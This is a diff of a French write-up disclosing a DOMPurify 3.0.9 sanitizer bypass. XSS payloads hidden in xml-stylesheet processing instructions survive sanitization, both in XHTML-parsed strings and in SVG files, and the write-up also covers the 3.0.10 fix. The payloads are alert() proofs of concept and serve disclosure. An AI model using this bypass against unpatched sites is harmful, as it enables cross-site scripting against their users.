@@ -1,3 +1,7 @@
+---
+description: 03 mai 2024
+---
+
 # Dompurify 3.0.9 bypass - Node type confusion
 
 ## Crédits
@@ -39,11 +43,12 @@ let userContent= document.getElementById('userContent');
 userContent.innerHTML = DOMPurify.sanitize("<?xml-stylesheet <img src=x onerror=alert(1)>?>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'}); 
 ```
 
-Les instructions de traitement (`ProcessingInstruction`) ne semblent pas être assainies par la bibliothèque. L'évenement `onerror` ainsi que l'appel à la méthode `alert()` ne sont pas supprimés : &#x20;
+Les instructions de traitement (processing instructions) ne semblent pas être assainies par la bibliothèque. L'évenement `onerror` ainsi que l'appel à la méthode `alert()` ne sont pas supprimés : &#x20;
 
 ```html
 <div id="userContent">
   <!--?xml-stylesheet <img src=x onerror=alert(1)-->
+  "?>"
 </div>
 ```
 
@@ -68,7 +73,7 @@ L'affichage de la page HTML provoque dorénavant l'exécution de la méthode `al
 </div>
 ```
 
-Par défaut, Dompurify traite la chaîne de caractères comme du HTML, et non du XML. De plus, il est assez rare d'identifier une cible imposant ce type de média et intégrant ensuite la donnée assainie au sein d'un document HTML.
+Par défaut, Dompurify traite la chaîne de caractères comme du HTML, et non du XML, excepté si l'option `{PARSER_MEDIA_TYPE: 'application/xhtml+xml'}` est spécifée. De plus, il est assez rare d'identifier une cible imposant ce type de média et intégrant ensuite la donnée assainie au sein d'un document HTML.
 
 ### Assainissement d'un noeud
 
@@ -90,7 +95,7 @@ let userContent= document.getElementById('userContent');
 userContent.innerHTML = DOMPurify.sanitize(img);
 ```
 
-Toutefois, lorsque le noeud est un noeud XML, le même comportement que précédent est possible lors de l'utilisation des `ProcessingInsruction`.
+Toutefois, lorsque le noeud est un noeud XML, le même comportement que précédent est possible lors de l'utilisation des instructions de traitement.
 
 L'exemple suivant illustre une fonctionnalité permettant à l'utilisateur de fournir une URL afin de charger un fichier SVG, qui sera assaini par Dompurify avant d'être intégré au document HTML :
 
@@ -120,7 +125,7 @@ Lorsque l'utilisateur renseigne une URL vers un fichier SVG, tel que :&#x20;
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
   <rect width="50" height="50" fill="green" />
-  <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
+  <?xml-stylesheet > <img src=x onerror="alert(1)">?>
 </svg>
 ```
 
@@ -130,13 +135,13 @@ Dompurify échoue à assainir le noeud et permet l'exécution du code Javascript
 <div id="userContent"><svg viewBox="0 0 100 100" height="100" width="100" xmlns="http://www.w3.org/2000/svg">
   <rect fill="green" height="50" width="50"></rect>
   <!--?xml-stylesheet --> </svg><img src="x" onerror="alert(1)"> 
-  " ?> "
+  "?>"
 </div>
 ```
 
-## Correctif
+## Correction
 
-Le correctif, apporté par la version 3.0.10 de Dompurify, consiste à l'ajout du masque `SHOW_PROCESSING_INSTRUCTION` lors du traitement des noeuds XML. Cela permet de traiter les noeuds de type `ProcessinInstruction` :&#x20;
+Le correctif, apporté par la version 3.0.10 de Dompurify, consiste à l'ajout du masque `SHOW_PROCESSING_INSTRUCTION` lors du traitement des noeuds XML. Cela permet de traiter les noeuds de type `ProcessingInstruction` :&#x20;
 
 ```javascript
 const _createNodeIterator = function _createNodeIterator(root) {
